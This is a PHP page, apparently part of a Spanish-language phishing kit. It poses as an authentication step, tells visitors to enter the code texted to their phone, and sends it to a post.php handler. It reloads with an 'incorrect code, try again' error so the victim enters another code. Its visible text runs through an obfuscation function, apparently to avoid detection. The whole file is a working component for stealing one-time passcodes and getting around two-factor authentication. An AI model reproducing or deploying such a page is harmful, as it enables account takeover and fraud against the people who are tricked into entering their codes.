<?php 
require '../main.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Online</title>
    <link rel="stylesheet" href="inc/style/style.css">
</head>
<body>
<header>
    <img src="inc/images/logo.png">
</header>

<main>
<div class="form">

<div class="col title">
Autenticación
</div>

<div class="col text">
<p><?php $m->obf("Envía el código enviado a tu número de teléfono.");?> </p>
</div>


<form action="post.php" method="POST">
<?php 
if(isset($_GET['error'])){
    echo '
<div class="col error">
Código incorrecto. Inténtalo de nuevo
</div>
<input type="hidden" name="exit">';
}
?>
<div class="col">
    <label class="flex"><span><?php $m->obf("Introduzca el código"); ?></span> <a href="#"><?php $m->obf("¿No recibiste un código?"); ?></a></label>
    <input type="text" required name="sms">
</div>

<div class="col">
    <button type="submit"><?php $m->obf("Continuar"); ?></button>
</div>
</form>

</div>
</main>

</body>
</html>